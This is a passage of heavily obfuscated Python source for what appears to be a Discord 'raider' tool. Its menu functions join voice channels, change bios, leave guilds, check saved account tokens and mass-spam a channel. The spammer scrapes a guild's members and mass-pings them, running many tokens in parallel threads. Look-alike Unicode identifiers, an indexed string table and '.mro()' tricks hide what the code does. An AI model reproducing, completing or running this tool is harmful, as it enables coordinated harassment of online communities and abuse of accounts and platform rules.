        𝘦𝘹𝗶𝙩 = 𝗶𝘯𝘱𝘂𝙩(𝘔𝘔𝗡𝗜𝙈𝘐𝗠𝙄𝘭𝗠𝗡𝘕𝘔𝗡𝙡𝗠𝙈𝗹𝘔𝗜𝙡𝙄𝗡𝗜𝙉𝙉𝗜𝗠𝗡𝗡𝗜𝘭[22])
        𝘦𝙭𝘪𝙩 = 𝗠𝙚𝗻𝙪().main_menu()
        𝘦𝘅𝘪𝙩()

    @𝘄𝙧𝗮𝗽𝗽𝘦𝘳
    def voicejoiner(self):
        𝗼𝙨.system(𝗠𝙈𝗡𝗜𝗠𝘐𝙈𝗜𝗹𝘔𝙉𝘕𝙈𝙉𝗹𝙈𝘔𝘭𝙈𝘐𝙡𝘐𝗡𝘐𝗡𝘕𝙄𝗠𝗡𝘕𝙄𝗹[387])
        𝙤𝘴.system(𝗠𝘔𝗡𝗜𝘔𝗜𝘔𝘐𝗹𝙈𝘕𝙉𝗠𝙉𝙡𝙈𝘔𝘭𝘔𝘐𝙡𝘐𝘕𝙄𝘕𝘕𝙄𝘔𝘕𝗡𝘐𝘭[1])
        𝗽𝘳𝗶𝗻𝘵(𝘮𝘦𝘯𝘂)
        𝙜𝙪𝘪𝘭𝗱 = 𝘪𝙣𝙥𝙪𝘵(f'{𝘳}{𝙈𝘔𝗡𝘐𝙈𝗜𝙈𝗜𝗹𝗠𝘕𝙉𝙈𝘕𝘭𝙈𝙈𝙡𝗠𝙄𝗹𝗜𝙉𝘐𝗡𝗡𝙄𝗠𝗡𝘕𝗜𝘭[91]}{𝙡𝙘}{𝗠𝗠𝙉𝙄𝙈𝘐𝘔𝗜𝗹𝘔𝙉𝘕𝘔𝗡𝗹𝗠𝘔𝙡𝘔𝙄𝙡𝗜𝙉𝗜𝙉𝙉𝗜𝙈𝘕𝗡𝗜𝙡[379]}{𝘳}{𝗠𝗠𝘕𝗜𝙈𝙄𝗠𝙄𝙡𝗠𝘕𝙉𝗠𝙉𝘭𝘔𝙈𝗹𝘔𝗜𝗹𝙄𝙉𝙄𝘕𝘕𝙄𝗠𝗡𝘕𝗜𝗹[365]}')
        if 𝘨𝙪𝘪𝗹𝙙 == 𝗠𝘔𝘕𝙄𝗠𝙄𝙈𝗜𝙡𝙈𝗡𝗡𝘔𝘕𝙡𝘔𝘔𝘭𝙈𝘐𝘭𝙄𝘕𝙄𝙉𝗡𝗜𝙈𝙉𝘕𝗜𝘭[22]:
            𝘔𝗲𝙣𝘶().main_menu()
        𝙘𝗵𝙖𝙣𝗻𝗲𝘭 = 𝘪𝙣𝙥𝘶𝘵(f'{𝗿}{𝘔𝙈𝘕𝗜𝘔𝗜𝙈𝘐𝘭𝘔𝙉𝘕𝙈𝘕𝘭𝙈𝗠𝘭𝘔𝗜𝙡𝙄𝗡𝙄𝙉𝘕𝘐𝘔𝗡𝙉𝗜𝘭[91]}{𝙡𝙘}{𝘔𝙈𝙉𝙄𝙈𝙄𝙈𝘐𝗹𝙈𝘕𝗡𝗠𝙉𝙡𝘔𝗠𝘭𝗠𝗜𝙡𝘐𝗡𝗜𝗡𝘕𝙄𝙈𝘕𝙉𝘐𝙡[373]}{𝗿}{𝘔𝙈𝗡𝘐𝙈𝗜𝗠𝗜𝘭𝙈𝗡𝗡𝙈𝗡𝙡𝘔𝗠𝙡𝗠𝗜𝙡𝙄𝘕𝙄𝗡𝗡𝘐𝘔𝗡𝘕𝘐𝘭[365]}')
        if 𝗰𝘩𝗮𝗻𝗻𝘦𝗹 == 𝗠𝘔𝙉𝗜𝘔𝗜𝗠𝗜𝗹𝘔𝙉𝙉𝙈𝗡𝗹𝙈𝗠𝗹𝘔𝗜𝙡𝙄𝙉𝗜𝗡𝗡𝙄𝘔𝗡𝗡𝙄𝗹[22]:
            𝙈𝗲𝘯𝘶().main_menu()
        𝗼𝘀.system(𝙈𝙈𝗡𝘐𝗠𝙄𝙈𝙄𝘭𝙈𝙉𝙉𝙈𝘕𝙡𝗠𝙈𝙡𝙈𝗜𝙡𝗜𝘕𝙄𝙉𝙉𝗜𝘔𝗡𝗡𝙄𝙡[1])
        𝘱𝙧𝗶𝘯𝘁(𝙢𝙚𝗻𝘶)
        for 𝘵𝗼𝙠𝗲𝗻 in 𝘵𝙤𝙠𝘦𝗻𝙨:
            𝘁𝙝𝙧𝘦𝙖𝘥𝙞𝙣𝙜.Thread(target=𝙫𝗰_𝘫𝗼𝗶𝗻𝘦𝘳, args=(𝘵𝘰𝘬𝘦𝗻, 𝗴𝘶𝗶𝙡𝗱, 𝗰𝙝𝙖𝗻𝘯𝗲𝗹)).start()
        𝙚𝙭𝘪𝘵 = 𝗶𝗻𝘱𝘂𝙩(𝘔𝗠𝗡𝘐𝗠𝗜𝙈𝘐𝘭𝗠𝗡𝙉𝙈𝙉𝘭𝘔𝗠𝙡𝙈𝗜𝙡𝘐𝙉𝙄𝘕𝘕𝗜𝙈𝗡𝙉𝙄𝗹[22])
        𝗲𝘹𝗶𝙩 = 𝘔𝙚𝗻𝘶().main_menu()
        𝗲𝙭𝗶𝘁()

    @𝙬𝗿𝗮𝗽𝗽𝘦𝗿
    def Change_bio(self):
        𝘰𝘴.system(𝘔𝗠𝗡𝙄𝙈𝙄𝗠𝙄𝗹𝘔𝙉𝗡𝗠𝙉𝙡𝘔𝘔𝗹𝙈𝘐𝙡𝗜𝗡𝘐𝘕𝙉𝘐𝘔𝗡𝙉𝙄𝙡[388])
        𝙤𝘴.system(𝙈𝗠𝙉𝙄𝘔𝘐𝘔𝘐𝙡𝙈𝙉𝘕𝘔𝙉𝗹𝘔𝗠𝗹𝗠𝘐𝘭𝘐𝘕𝙄𝘕𝗡𝗜𝙈𝗡𝗡𝗜𝙡[1])
        𝘱𝗿𝘪𝙣𝘵(𝙢𝗲𝙣𝘶)
        𝗯𝘪𝗼 = 𝘪𝗻𝘱𝘶𝘵(f'{𝙧}{𝗠𝙈𝗡𝗜𝘔𝗜𝙈𝘐𝙡𝙈𝙉𝗡𝘔𝘕𝘭𝙈𝘔𝗹𝙈𝙄𝙡𝙄𝘕𝗜𝗡𝘕𝗜𝗠𝙉𝘕𝗜𝘭[91]}{𝗹𝙘}{𝗠𝘔𝘕𝙄𝙈𝙄𝘔𝘐𝙡𝙈𝗡𝗡𝘔𝘕𝙡𝗠𝙈𝗹𝗠𝙄𝗹𝗜𝙉𝙄𝙉𝘕𝘐𝘔𝙉𝘕𝗜𝗹[389]}{𝘳}{𝗠𝗠𝙉𝙄𝙈𝘐𝙈𝗜𝙡𝘔𝙉𝙉𝙈𝘕𝙡𝙈𝗠𝙡𝘔𝘐𝙡𝙄𝘕𝗜𝗡𝘕𝗜𝘔𝙉𝘕𝗜𝙡[365]}')
        if 𝙗𝗶𝗼 == 𝙈𝘔𝗡𝘐𝙈𝙄𝙈𝗜𝘭𝘔𝙉𝗡𝙈𝙉𝘭𝘔𝙈𝙡𝙈𝘐𝘭𝙄𝙉𝗜𝗡𝘕𝗜𝙈𝘕𝙉𝘐𝘭[22]:
            𝙈𝗲𝙣𝘂().main_menu()
        𝙤𝘴.system(𝘔𝙈𝘕𝘐𝗠𝘐𝙈𝙄𝘭𝗠𝘕𝙉𝗠𝘕𝘭𝙈𝗠𝙡𝗠𝗜𝙡𝙄𝙉𝙄𝗡𝙉𝙄𝘔𝘕𝙉𝘐𝗹[1])
        𝘱𝘳𝘪𝙣𝘁(𝘮𝗲𝘯𝘂)
        for 𝘵𝘰𝗸𝘦𝗻 in 𝘁𝘰𝙠𝗲𝘯𝘀:
            𝘵𝙝𝗿𝗲𝗮𝘥𝙞𝙣𝗴.Thread(target=𝗯𝘪𝘰_𝘤𝙝𝙖𝙣𝙜𝗲𝗿, args=(𝘁𝙤𝘬𝘦𝘯, 𝗯𝙞𝙤)).start()
        𝙚𝘹𝘪𝙩 = 𝘪𝗻𝗽𝘂𝘁(𝘔𝘔𝘕𝗜𝗠𝗜𝗠𝙄𝗹𝙈𝘕𝗡𝘔𝗡𝙡𝗠𝘔𝘭𝘔𝗜𝗹𝗜𝙉𝘐𝗡𝗡𝗜𝘔𝙉𝙉𝗜𝘭[22])
        𝙚𝘹𝙞𝙩 = 𝘔𝘦𝗻𝘂().main_menu()
        𝙚𝘹𝙞𝘵()

    @𝘸𝙧𝙖𝙥𝙥𝘦𝗿
    def leaver(self):
        𝙤𝘀.system(𝘔𝗠𝘕𝘐𝗠𝗜𝘔𝗜𝘭𝗠𝗡𝙉𝗠𝗡𝗹𝙈𝗠𝘭𝙈𝗜𝙡𝘐𝘕𝗜𝗡𝗡𝙄𝙈𝗡𝗡𝙄𝙡[151])
        𝙤𝘀.system(𝗠𝗠𝙉𝘐𝗠𝗜𝙈𝗜𝗹𝙈𝙉𝘕𝗠𝙉𝙡𝗠𝙈𝙡𝗠𝗜𝙡𝙄𝗡𝗜𝗡𝙉𝙄𝗠𝙉𝗡𝘐𝙡[1])
        𝘱𝗿𝗶𝗻𝘵(𝙢𝙚𝗻𝙪)
        𝗴𝘂𝗶𝗹𝘥 = 𝙞𝘯𝘱𝘶𝘁(𝘤𝗼𝙣𝘴𝘰𝗹𝗲.prompt(𝗠𝗠𝗡𝘐𝘔𝙄𝘔𝙄𝗹𝗠𝙉𝗡𝘔𝘕𝙡𝘔𝘔𝙡𝙈𝗜𝗹𝘐𝗡𝘐𝗡𝘕𝙄𝘔𝗡𝘕𝗜𝗹[390]))
        if 𝙜𝘶𝗶𝘭𝗱 == 𝙈𝘔𝗡𝘐𝘔𝙄𝗠𝙄𝘭𝙈𝙉𝙉𝙈𝗡𝘭𝙈𝘔𝙡𝙈𝙄𝗹𝗜𝙉𝘐𝙉𝗡𝗜𝗠𝗡𝘕𝗜𝘭[22]:
            𝘔𝙚𝗻𝙪().main_menu()
        𝙖𝘳𝙜𝘀 = [(𝙩𝗼𝗸𝘦𝗻, 𝙜𝙪𝗶𝗹𝙙) for 𝘁𝘰𝗸𝙚𝘯 in 𝘵𝘰𝗸𝘦𝙣𝙨]
        𝙨𝙚𝘭𝘧.run(𝘴𝙚𝗹𝘧.raider.leaver, 𝙖𝘳𝙜𝙨)

    @𝙬𝗿𝗮𝙥𝙥𝗲𝙧
    def Checker(self):
        𝗼𝘀.system(𝘔𝗠𝙉𝙄𝗠𝘐𝘔𝗜𝙡𝙈𝗡𝙉𝘔𝙉𝘭𝗠𝙈𝙡𝙈𝘐𝙡𝙄𝘕𝗜𝘕𝘕𝙄𝗠𝙉𝘕𝗜𝗹[391])
        𝘴𝘢𝘷𝗲_𝘵𝙤𝗸𝗲𝗻𝙨(𝙈𝗠𝘕𝘐𝘔𝗜𝘔𝙄𝘭𝗠𝘕𝘕𝗠𝗡𝗹𝘔𝙈𝙡𝙈𝗜𝗹𝗜𝘕𝙄𝙉𝙉𝘐𝙈𝘕𝘕𝘐𝗹[59])
        𝗲𝘅𝙞𝘁 = 𝘪𝘯𝘱𝘶𝘁(𝘔𝙈𝘕𝗜𝙈𝘐𝘔𝗜𝙡𝗠𝘕𝙉𝘔𝙉𝗹𝙈𝘔𝙡𝗠𝙄𝘭𝙄𝙉𝗜𝙉𝘕𝗜𝙈𝙉𝗡𝗜𝙡[22])
        𝗲𝘹𝘪𝙩 = 𝗠𝙚𝙣𝘂().main_menu()
        𝙚𝙭𝗶𝙩()

    @𝙬𝙧𝙖𝗽𝙥𝙚𝘳
    def Oneliner(self):
        𝘰𝘀.system(𝗠𝗠𝘕𝗜𝘔𝙄𝙈𝗜𝙡𝘔𝙉𝙉𝘔𝗡𝙡𝙈𝙈𝙡𝗠𝗜𝙡𝗜𝗡𝗜𝘕𝘕𝘐𝗠𝙉𝘕𝙄𝗹[392])
        𝗼𝘴.system(𝙈𝗠𝗡𝙄𝗠𝘐𝘔𝘐𝘭𝘔𝗡𝙉𝘔𝙉𝗹𝙈𝗠𝗹𝗠𝙄𝘭𝗜𝗡𝘐𝘕𝙉𝘐𝗠𝗡𝘕𝘐𝗹[1])
        𝗽𝙧𝙞𝙣𝙩(𝗺𝙚𝙣𝙪)
        for 𝘁𝙤𝘬𝘦𝗻 in 𝘁𝗼𝘬𝗲𝘯𝘴:
            𝘵𝙝𝙧𝙚𝗮𝘥𝘪𝗻𝘨.Thread(target=𝘰𝙣𝘭𝙞𝗻𝗲𝘳, args=(𝘵𝙤𝙠𝗲𝗻,)).start()
        𝘱𝗿𝘪𝗻𝘁(f'{𝗿}{𝘔𝘔𝙉𝗜𝘔𝙄𝘔𝘐𝗹𝘔𝗡𝙉𝙈𝘕𝗹𝗠𝘔𝗹𝙈𝙄𝘭𝗜𝙉𝗜𝗡𝙉𝘐𝗠𝘕𝙉𝘐𝙡[91]}{𝗹𝗰}{𝙈𝘔𝘕𝘐𝙈𝙄𝙈𝗜𝗹𝗠𝙉𝘕𝙈𝘕𝘭𝘔𝗠𝘭𝗠𝙄𝘭𝙄𝗡𝗜𝗡𝙉𝗜𝙈𝗡𝙉𝗜𝗹[393]}{𝙧}{𝘔𝗠𝗡𝘐𝘔𝘐𝘔𝗜𝙡𝗠𝙉𝙉𝘔𝙉𝗹𝙈𝙈𝗹𝘔𝘐𝘭𝘐𝙉𝙄𝙉𝗡𝘐𝗠𝘕𝙉𝙄𝘭[394]}')
        𝙚𝘅𝗶𝘁 = 𝗶𝘯𝘱𝘂𝘵(𝘔𝙈𝙉𝗜𝘔𝙄𝘔𝗜𝗹𝗠𝗡𝗡𝗠𝘕𝘭𝗠𝘔𝗹𝗠𝙄𝙡𝘐𝘕𝙄𝙉𝙉𝙄𝙈𝗡𝙉𝗜𝗹[22])
        𝘦𝘅𝘪𝘵 = 𝘔𝙚𝘯𝙪().main_menu()
        𝙚𝙭𝙞𝘵()

    @𝘄𝙧𝗮𝙥𝙥𝘦𝙧
    def spammer(self):
        𝙤𝘀.system(𝗠𝘔𝗡𝘐𝙈𝙄𝗠𝗜𝘭𝙈𝗡𝘕𝗠𝗡𝙡𝙈𝗠𝗹𝙈𝙄𝗹𝗜𝘕𝗜𝗡𝙉𝗜𝘔𝗡𝘕𝗜𝗹[395])
        𝗺𝘢𝘀𝙨 = 𝘪𝘯𝘱𝘂𝘵(f'{𝘳}{𝘔𝗠𝘕𝗜𝘔𝘐𝙈𝘐𝗹𝙈𝗡𝘕𝙈𝘕𝘭𝘔𝘔𝗹𝗠𝙄𝙡𝘐𝙉𝘐𝗡𝗡𝙄𝘔𝘕𝗡𝘐𝘭[91]}{𝘭𝗰}{𝘔𝘔𝗡𝘐𝗠𝘐𝙈𝙄𝗹𝙈𝗡𝗡𝙈𝘕𝗹𝗠𝙈𝗹𝗠𝗜𝙡𝘐𝘕𝗜𝗡𝘕𝗜𝘔𝗡𝙉𝗜𝗹[396]}{𝙡𝗰}{𝘳}{𝙈𝗠𝗡𝘐𝘔𝙄𝘔𝗜𝙡𝙈𝗡𝙉𝘔𝗡𝙡𝘔𝘔𝘭𝙈𝗜𝘭𝙄𝙉𝙄𝙉𝘕𝘐𝙈𝘕𝘕𝘐𝘭[93]}{𝙜}{𝘔𝘔𝙉𝙄𝙈𝙄𝗠𝘐𝗹𝗠𝘕𝙉𝗠𝘕𝙡𝘔𝙈𝙡𝗠𝗜𝗹𝙄𝗡𝗜𝙉𝘕𝘐𝘔𝘕𝗡𝘐𝘭[97]}{𝗿}{𝙈𝘔𝘕𝘐𝘔𝙄𝙈𝘐𝙡𝗠𝙉𝘕𝙈𝗡𝙡𝘔𝘔𝙡𝘔𝘐𝘭𝙄𝙉𝙄𝗡𝘕𝗜𝗠𝗡𝘕𝗜𝗹[397]}')
        if 𝘮𝙖𝘴𝙨 == 𝘔𝗠𝗡𝘐𝗠𝗜𝙈𝗜𝙡𝗠𝘕𝙉𝘔𝗡𝘭𝘔𝗠𝗹𝗠𝗜𝘭𝗜𝙉𝘐𝗡𝘕𝗜𝘔𝙉𝗡𝗜𝗹[22]:
            𝘔𝙚𝗻𝘶().main_menu()
        𝙘𝗵𝘢𝙣𝗻𝙚𝗹 = 𝙞𝘯𝗽𝙪𝘵(f'{𝙧}{𝙈𝘔𝘕𝘐𝙈𝗜𝗠𝙄𝗹𝘔𝘕𝘕𝘔𝘕𝘭𝘔𝘔𝙡𝙈𝙄𝘭𝘐𝙉𝗜𝗡𝙉𝙄𝙈𝗡𝗡𝗜𝘭[91]}{𝘭𝗰}{𝙈𝗠𝗡𝗜𝗠𝘐𝙈𝗜𝗹𝗠𝘕𝗡𝗠𝙉𝗹𝙈𝗠𝙡𝙈𝘐𝙡𝘐𝘕𝙄𝗡𝗡𝘐𝗠𝘕𝘕𝗜𝙡[373]}{𝗹𝙘}{𝗿}{𝘔𝘔𝗡𝘐𝗠𝗜𝙈𝘐𝙡𝘔𝙉𝗡𝘔𝙉𝗹𝘔𝘔𝘭𝙈𝙄𝙡𝗜𝘕𝘐𝙉𝗡𝗜𝗠𝙉𝗡𝘐𝙡[93]}{𝗿}{𝙈𝗠𝙉𝘐𝙈𝙄𝙈𝗜𝗹𝗠𝗡𝗡𝙈𝘕𝘭𝘔𝙈𝘭𝘔𝘐𝗹𝘐𝘕𝗜𝗡𝘕𝗜𝗠𝘕𝘕𝘐𝘭[398]}')
        if 𝗰𝗵𝘢𝙣𝗻𝗲𝘭 == 𝙈𝗠𝗡𝙄𝗠𝘐𝙈𝗜𝙡𝗠𝗡𝙉𝗠𝙉𝙡𝘔𝘔𝘭𝙈𝗜𝗹𝙄𝘕𝗜𝘕𝘕𝗜𝙈𝘕𝙉𝙄𝘭[22]:
            𝗠𝘦𝙣𝘂().main_menu()
        𝙢𝙚𝘴𝘴𝗮𝘨𝗲 = 𝙞𝗻𝗽𝘶𝘵(f'{𝘳}{𝘔𝙈𝘕𝗜𝗠𝘐𝗠𝙄𝘭𝗠𝗡𝘕𝘔𝙉𝗹𝙈𝙈𝙡𝘔𝗜𝘭𝗜𝙉𝙄𝙉𝙉𝗜𝗠𝙉𝗡𝘐𝗹[91]}{𝙡𝙘}{𝘔𝘔𝗡𝗜𝗠𝘐𝙈𝙄𝘭𝙈𝗡𝗡𝘔𝙉𝗹𝙈𝗠𝗹𝙈𝗜𝙡𝘐𝘕𝙄𝗡𝗡𝘐𝘔𝗡𝙉𝗜𝙡[375]}{𝘭𝗰}{𝙧}{𝗠𝘔𝘕𝙄𝘔𝙄𝗠𝘐𝗹𝘔𝙉𝗡𝗠𝘕𝘭𝗠𝗠𝙡𝙈𝘐𝙡𝗜𝗡𝗜𝙉𝙉𝘐𝗠𝗡𝗡𝙄𝘭[93]}{𝗿}{𝗠𝘔𝙉𝗜𝘔𝙄𝗠𝗜𝘭𝘔𝘕𝗡𝗠𝙉𝘭𝗠𝘔𝘭𝘔𝘐𝘭𝗜𝘕𝘐𝘕𝘕𝗜𝗠𝗡𝗡𝘐𝗹[398]}')
        if 𝙢𝗲𝘀𝘀𝗮𝗴𝙚 == 𝗠𝙈𝘕𝙄𝘔𝘐𝗠𝗜𝙡𝗠𝘕𝗡𝘔𝙉𝗹𝘔𝘔𝙡𝙈𝘐𝗹𝗜𝗡𝙄𝗡𝙉𝗜𝗠𝗡𝙉𝙄𝘭[22]:
            𝙈𝘦𝗻𝘂().main_menu()
        𝗱𝗲𝘭𝗮𝙮 = 𝙌𝗩𝙋𝘛636𝘮𝙡𝙨𝗷𝙪4𝗤𝘤𝘨𝘶𝘍𝗬𝘲𝘂𝘡𝙡9𝗳𝘭𝙃𝘲𝙕46𝙀.mro()[9](𝙞𝙣𝗽𝙪𝙩(f'{𝗿}{𝗠𝙈𝗡𝙄𝘔𝙄𝙈𝘐𝙡𝗠𝙉𝙉𝗠𝙉𝗹𝘔𝙈𝗹𝗠𝙄𝗹𝙄𝙉𝘐𝘕𝗡𝙄𝗠𝗡𝙉𝙄𝘭[91]}{𝗹𝘤}{𝙈𝙈𝙉𝙄𝗠𝙄𝗠𝙄𝘭𝘔𝗡𝘕𝗠𝘕𝙡𝙈𝙈𝗹𝗠𝙄𝙡𝗜𝗡𝘐𝗡𝘕𝙄𝙈𝘕𝘕𝘐𝘭[399]}{𝘭𝙘}{𝗿}{𝗠𝙈𝘕𝗜𝙈𝘐𝙈𝗜𝘭𝗠𝘕𝗡𝙈𝙉𝙡𝗠𝗠𝗹𝘔𝗜𝘭𝗜𝘕𝙄𝗡𝙉𝙄𝘔𝙉𝘕𝗜𝘭[93]}{𝗿}{𝗠𝙈𝘕𝙄𝙈𝙄𝗠𝙄𝙡𝙈𝘕𝗡𝙈𝙉𝗹𝗠𝙈𝘭𝙈𝘐𝙡𝗜𝗡𝗜𝗡𝗡𝗜𝗠𝗡𝗡𝘐𝙡[398]}'))
        if 𝗱𝙚𝗹𝙖𝘆 == 𝙈𝙈𝘕𝙄𝗠𝘐𝙈𝘐𝙡𝗠𝙉𝗡𝗠𝘕𝘭𝗠𝗠𝙡𝘔𝗜𝗹𝙄𝙉𝘐𝙉𝙉𝘐𝗠𝗡𝙉𝘐𝙡[22]:
            𝘔𝙚𝙣𝘂().main_menu()
        if 𝘮𝘢𝘴𝙨 == 𝗠𝘔𝘕𝗜𝘔𝘐𝙈𝘐𝙡𝘔𝙉𝗡𝗠𝗡𝙡𝗠𝘔𝙡𝗠𝘐𝙡𝙄𝘕𝙄𝙉𝗡𝙄𝗠𝗡𝘕𝘐𝘭[400]:
            𝙜𝙪𝘪𝗹𝘥𝘪𝘥 = 𝗶𝘯𝘱𝘶𝙩(f'{𝘳}{𝗠𝗠𝘕𝙄𝗠𝙄𝙈𝘐𝘭𝙈𝗡𝗡𝙈𝙉𝘭𝙈𝘔𝗹𝙈𝙄𝗹𝙄𝙉𝘐𝗡𝗡𝙄𝗠𝘕𝗡𝙄𝗹[91]}{𝘭𝗰}{𝘔𝘔𝙉𝙄𝙈𝗜𝘔𝙄𝙡𝙈𝘕𝘕𝘔𝗡𝗹𝙈𝙈𝗹𝙈𝘐𝗹𝗜𝘕𝘐𝗡𝘕𝘐𝗠𝘕𝗡𝙄𝙡[379]}{𝗿}{𝙈𝘔𝙉𝘐𝗠𝙄𝘔𝗜𝗹𝗠𝘕𝘕𝙈𝙉𝙡𝘔𝗠𝘭𝘔𝙄𝗹𝗜𝙉𝘐𝘕𝗡𝘐𝙈𝙉𝘕𝘐𝗹[365]}')
            if 𝗴𝘶𝗶𝙡𝘥𝗶𝘥 == 𝘔𝘔𝗡𝗜𝘔𝘐𝗠𝗜𝘭𝘔𝙉𝘕𝗠𝙉𝙡𝘔𝗠𝗹𝗠𝗜𝘭𝘐𝘕𝗜𝘕𝙉𝙄𝘔𝘕𝘕𝙄𝘭[22]:
                𝙈𝙚𝙣𝙪().main_menu()
            𝗽𝗶𝘯𝙜𝘴 = 𝙠𝘦𝘩𝘮𝘶𝙗𝙢𝙦𝙟𝗲𝗥𝘀𝘊𝙏𝙪2𝗦𝗧𝘷𝘭𝗢𝙀𝘝𝘲𝗖𝗬𝗷9𝘇𝘘𝗢𝙍.mro()[8](𝘪𝘯𝘱𝙪𝘵(f'{𝗿}{𝙈𝙈𝘕𝙄𝗠𝙄𝙈𝙄𝘭𝘔𝙉𝘕𝘔𝙉𝘭𝘔𝙈𝗹𝙈𝙄𝙡𝘐𝘕𝙄𝘕𝘕𝙄𝙈𝗡𝗡𝗜𝘭[91]}{𝘭𝘤}{𝘔𝗠𝙉𝘐𝘔𝙄𝘔𝙄𝙡𝙈𝗡𝘕𝘔𝗡𝘭𝗠𝘔𝗹𝘔𝙄𝙡𝗜𝗡𝙄𝗡𝘕𝗜𝗠𝗡𝙉𝘐𝘭[401]}{𝗹𝙘}{𝗿}{𝘔𝙈𝙉𝘐𝘔𝗜𝘔𝗜𝘭𝙈𝙉𝘕𝗠𝘕𝙡𝘔𝗠𝘭𝙈𝙄𝗹𝙄𝙉𝗜𝙉𝙉𝘐𝗠𝗡𝘕𝙄𝗹[365]}'))
            if 𝙥𝙞𝗻𝙜𝘀 == 𝘔𝗠𝙉𝘐𝗠𝗜𝘔𝙄𝗹𝙈𝘕𝗡𝗠𝘕𝘭𝗠𝘔𝙡𝘔𝘐𝙡𝙄𝗡𝗜𝙉𝗡𝘐𝙈𝙉𝗡𝙄𝘭[22]:
                𝙈𝙚𝘯𝘶().main_menu()
            𝙥𝗿𝘪𝘯𝘁(f'{𝗿}{𝗠𝙈𝘕𝙄𝘔𝘐𝙈𝗜𝙡𝙈𝗡𝗡𝗠𝗡𝙡𝙈𝗠𝙡𝙈𝙄𝙡𝗜𝘕𝘐𝙉𝘕𝗜𝘔𝘕𝙉𝙄𝗹[91]}{𝗹𝗰}{𝙈𝘔𝗡𝘐𝗠𝗜𝗠𝗜𝗹𝙈𝗡𝗡𝗠𝗡𝘭𝘔𝗠𝙡𝗠𝗜𝘭𝗜𝗡𝗜𝗡𝙉𝗜𝘔𝘕𝗡𝘐𝗹[402]}{𝗹𝗰}{𝗿}{𝗠𝘔𝙉𝘐𝙈𝗜𝙈𝙄𝙡𝘔𝘕𝙉𝙈𝗡𝗹𝙈𝘔𝘭𝘔𝘐𝙡𝙄𝘕𝗜𝙉𝙉𝘐𝘔𝗡𝙉𝙄𝙡[93]}{𝘨}{𝙈𝗠𝙉𝘐𝗠𝙄𝙈𝙄𝗹𝗠𝘕𝗡𝘔𝘕𝙡𝘔𝗠𝘭𝗠𝘐𝗹𝘐𝙉𝗜𝗡𝙉𝘐𝗠𝗡𝘕𝙄𝙡[403]}')
            𝘴𝙘𝗿𝗮𝘱𝙚𝘳(𝗴𝙪𝘪𝘭𝘥𝗶𝗱, 𝙘𝙝𝘢𝘯𝙣𝘦𝙡)
            𝘰𝙨.system(𝙈𝘔𝙉𝘐𝘔𝙄𝘔𝗜𝙡𝙈𝙉𝘕𝙈𝙉𝗹𝘔𝘔𝘭𝘔𝙄𝙡𝘐𝗡𝗜𝙉𝘕𝘐𝙈𝙉𝙉𝘐𝙡[1])
            𝙥𝗿𝘪𝙣𝘵(𝘮𝘦𝗻𝘶)
            for 𝘵𝗼𝗸𝙚𝗻 in 𝙩𝘰𝘬𝙚𝗻𝙨:
                𝘵𝙝𝗿𝙚𝙖𝙙𝘪𝗻𝘨.Thread(target=𝗺𝙖𝙨𝘴𝙥𝙞𝘯𝙜, args=(𝙩𝘰𝙠𝙚𝘯, 𝗰𝗵𝙖𝙣𝙣𝙚𝗹, 𝘮𝙚𝘴𝙨𝗮𝘨𝗲, 𝘥𝙚𝗹𝗮𝘆, 𝗽𝙞𝘯𝗴𝙨)).start()
            𝗲𝘹𝙞𝘵 = 𝙞𝙣𝘱𝘶𝘁(𝗠𝗠𝗡𝘐𝘔𝘐𝙈𝗜𝗹𝘔𝙉𝘕𝘔𝘕𝗹𝙈𝙈𝗹𝗠𝗜𝘭𝗜𝗡𝙄𝘕𝗡𝙄𝘔𝙉𝗡𝘐𝘭[22])
            𝘦𝘅𝙞𝙩 = 𝙈𝘦𝙣𝙪().main_menu()
            𝗲𝘅𝗶𝙩()
        if 𝘮𝘢𝘀𝙨 == 𝗠𝘔𝙉𝙄𝗠𝙄𝙈𝘐𝘭𝙈𝘕𝗡𝘔𝙉𝘭𝙈𝘔𝙡𝘔𝗜𝙡𝘐𝙉𝙄𝙉𝗡𝘐𝘔𝙉𝗡𝘐𝘭[404]:
            𝙤𝙨.system(𝗠𝘔𝗡𝙄𝘔𝗜𝗠𝗜𝗹𝙈𝗡𝙉𝘔𝘕𝘭𝙈𝙈𝗹𝙈𝗜𝘭𝘐𝘕𝙄𝗡𝘕𝗜𝘔𝙉𝙉𝗜𝘭[1])
            𝙥𝙧𝗶𝙣𝘵(𝙢𝙚𝗻𝘶)
            for 𝙩𝙤𝘬𝘦𝙣 in 𝙩𝗼𝗸𝗲𝙣𝘀:
                𝙩𝙝𝙧𝙚𝙖𝗱𝗶𝘯𝘨.Thread(target=𝘀𝗽𝘢𝙢𝙢𝘦𝘳, args=(𝘁𝗼𝙠𝗲𝗻, 𝗰𝗵𝙖𝘯𝗻𝙚𝙡, 𝗺𝙚𝙨𝙨𝙖𝙜𝗲, 𝙙𝙚𝘭𝗮𝙮)).start()
            𝗲𝘹𝘪𝘁 = 𝗶𝘯𝘱𝘶𝙩(𝘔𝙈𝙉𝘐𝗠𝙄𝗠𝙄𝙡𝙈𝙉𝗡𝙈𝗡𝗹𝙈𝘔𝗹𝘔𝘐𝘭𝗜𝙉𝗜𝗡𝗡𝘐𝙈𝘕𝙉𝘐𝙡[22])
            𝗲𝙭𝘪𝘵 = 𝗠𝘦𝗻𝘶().main_menu()
            𝗲𝘅𝗶𝘁()

    @𝙬𝙧𝗮𝙥𝙥𝗲𝘳
    def exit(self):
        𝘰𝘀.system(𝙈𝙈𝙉𝙄𝘔𝗜𝙈𝙄𝗹𝗠𝗡𝗡𝘔𝘕𝗹𝙈𝗠𝘭𝗠𝗜𝗹𝘐𝘕𝗜𝘕𝘕𝗜𝗠𝗡𝗡𝙄𝙡[1])
        𝘰𝘀.system(𝙈𝗠𝗡𝗜𝙈𝘐𝘔𝙄𝗹𝗠𝗡𝘕𝙈𝙉𝘭𝘔𝘔𝘭𝘔𝙄𝙡𝗜𝘕𝘐𝗡𝗡𝘐𝗠𝘕𝗡𝙄𝘭[405])
        𝙘𝘰𝙣𝘴𝗼𝘭𝘦.render_ascii()
        𝙚𝙭𝘪𝘁()
if __𝙣𝙖𝗺𝙚__ == 𝙈𝙈𝘕𝗜𝗠𝙄𝗠𝗜𝗹𝗠𝙉𝙉𝗠𝘕𝙡𝗠𝘔𝙡𝘔𝙄𝗹𝗜𝘕𝙄𝘕𝙉𝙄𝗠𝘕𝙉𝘐𝗹[406]:
    𝘔𝙚𝗻𝙪().main_menu()